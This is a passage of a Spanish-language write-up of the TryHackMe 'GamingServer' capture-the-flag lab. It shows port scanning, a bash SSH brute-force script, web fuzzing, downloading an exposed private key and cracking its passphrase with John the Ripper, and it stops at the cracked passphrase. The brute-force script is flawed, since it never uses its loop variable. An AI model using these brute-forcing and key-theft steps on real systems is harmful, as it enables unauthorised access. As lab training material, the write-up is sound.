## TryHackMe  <> GamingServer

![image](https://github.com/Esevka/CTF/assets/139042999/498c4185-0e3c-4f9b-b116-6dc643d2e93e)

Enlace Maquina: https://tryhackme.com/room/gamingserver

Enunciado : Obtener  flags de usuario y root.
---
---

## Escaneo de puertos

-Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido por proximidad al valor 64 podriamos decir que es una maquina Linux.

    ┌──(root㉿kali)-[/home/kali]
    └─# ping -c1 10.10.236.80
    PING 10.10.236.80 (10.10.236.80) 56(84) bytes of data.
    64 bytes from 10.10.236.80: icmp_seq=1 ttl=63 time=214 ms
    
    --- 10.10.236.80 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 214.202/214.202/214.202/0.000 ms
    
-Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.236.80 -oN open_ports
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 17:10 CEST
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63
                                                                                                                                                                                  
    ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/nmap]
    └─# nmap -p 22,80 -sCV 10.10.236.80 -vvv -oN info_ports                        
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 17:11 CEST
    
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 340efe0612673ea4ebab7ac4816dfea9 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
    |   256 49611ef4526e7b2998db302d16edf48b (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
    |   256 b860c45bb7b2d023a0c756595c631ec4 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
    
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: GET POST OPTIONS HEAD
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: House of danak
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

-Revisamos la web en busqueda de info que nos pueda servir.

  - En el codigo de la web encontramos un posible usuario ---> john
    
        john, please add some actual content to the site! lorem ipsum is horrible to look at.
      

  - Si entramos en el apartado "DRAAGAN LORE" encontramos un boton "Uploads" que nos lista el contenido del directorio.
  
      ![image](https://github.com/Esevka/CTF/assets/139042999/4f6fafd0-f46a-49b4-af5f-bb64f865c9b8)

    Nos descargamos dict.lst, segun hemos visto puede ser un diccionario de posibles claves para el usuario anteriormente encontrado john.

  - Podriamos hacer un pequeno script en bash que intente conectar por el servicio ssh del puerto 22 probando esas claves.

      Creamos el script y le damos permisos de ejecucion

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/script]
        └─# touch brute_ssh.sh
                                                                                                                                                                                      
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/script]
        └─# chmod +x brute_ssh.sh
    
  - Contenido del script y su ejecucion, no pudimos loguearnos por ssh.
  
        #!/bin/bash
        for pass in $(cat ../content/dict.lst)
          do
            echo $pass
            sshpass -p $'("pass")' ssh john@10.10.236.80  -o StrictHostKeyChecking=no
          done
  
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/script]
        └─# ./brute_ssh.sh
        Spring2017
        Warning: Permanently added '10.10.236.80' (ED25519) to the list of known hosts.
        Permission denied, please try again.
        Spring2016
        Permission denied, please try again.
        Spring2015
        Permission denied, please try again.
    
-Fuzzeamos la web

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/gamingserver]
    └─# gobuster dir -u http://10.10.236.80 -w /usr/share/wordlists/dirb/common.txt -o fuzz
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    /secret               (Status: 301) [Size: 313] [--> http://10.10.236.80/secret/]
    /server-status        (Status: 403) [Size: 277]
    /uploads              (Status: 301) [Size: 314] [--> http://10.10.236.80/uploads/]

  - Encontramos en el directorio /secret un fichero "secretKey" lo que puede ser una clave privada del usuario john para conectarnos por ssh
    
      ![image](https://github.com/Esevka/CTF/assets/139042999/ae93dacb-e0ff-48af-bad9-92975c87fb4f)

      ![image](https://github.com/Esevka/CTF/assets/139042999/7e6f4292-b075-44f1-82c2-1b530e567f83)


  - Nos la copiamos a nuestra maquina y le damos permisos solo de lectura, intentamos conectarnos.
      
        ┌──(root㉿kali)-[/home/kali/Desktop/ctf/gamingserver]
        └─# curl http://10.10.236.80/secret/secretKey -o content/id_rsa
          % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                         Dload  Upload   Total   Spent    Left  Speed
        100  1766  100  1766    0     0  13357      0 --:--:-- --:--:-- --:--:-- 13378                                        
                                                                                                                                                                                      
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# cat id_rsa        
        -----BEGIN RSA PRIVATE KEY-----
        Proc-Type: 4,ENCRYPTED
        DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
        
        T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
        H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
        FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
        Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
        [...]

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# chmod 400 id_rsa

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# ssh john@10.10.236.80 -i id_rsa            
        Enter passphrase for key 'id_rsa':

      Nos pide clave para poder utiliar la clave privada que hemos proporcionado, por lo que vamos a intentar crakearla utilizando el diccionario que encontramos anteriormente.

-Crakeamos la id_rsa
    
- Utilizamos ssh2john para generar un fichero que podamos crakear con johntheripper.

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# ssh2john id_rsa > idrsa_hashjohn
                                                                                                                                                                                          
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# cat idrsa_hashjohn 
            id_rsa:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba
            [...]

- Obtencion de la clave 

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# john --wordlist dict.lst idrsa_john --format=SSH             
        Using default input encoding: UTF-8
        Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
        No password hashes left to crack (see FAQ)
                                                                                                                                                                                      
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# john idrsa_john --show
        id_rsa:letmein
        
        1 password hash cracked, 0 left

        


    
                                                                   

        

